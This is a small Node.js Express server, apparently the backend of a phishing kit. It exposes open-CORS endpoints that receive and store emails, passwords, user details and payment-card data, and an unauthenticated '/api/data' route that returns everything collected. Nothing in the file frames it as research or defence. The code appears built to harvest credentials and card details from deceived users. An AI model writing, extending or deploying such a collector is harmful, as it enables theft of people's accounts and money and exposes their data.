const express = require('express');
    app = express();
    // path = require('path');
    // fs = require ('fs');
    cors = require('cors');
    bodyParser = require('body-parser');
 
    app.use(cors());
    app.use(bodyParser.json());
// Request 

app.get('/', (req, res) => {
    res.send('Server is running...!')
})

let UserAccount = [];

app.get('/api/data', (req, res) => {
    res.status(200).send(UserAccount);
});

app.post('/get-email', (req, res) => {
    const email = req.body;
    UserAccount.push(email);
    res.status(200).send('Email received and stored!'); 
});

app.post('/get-psw', (req, res) => {
    const psw = req.body;
    UserAccount.push(psw);
    res.status(200).send('Password received and stored!'); 
});

app.post('/get-infoU', (req, res) => {
    const infoU = req.body;
    UserAccount.push(infoU);
    res.status(200).send('InfoUser received and stored!'); 
});

app.post('/get-userC', (req, res) => {
    const userC = req.body;
    UserAccount.push(userC);
    res.status(200).send('UserCard received and stored!'); 
});

// End Request 

app.listen(8080, () => {
  console.log(`server started well !`);
});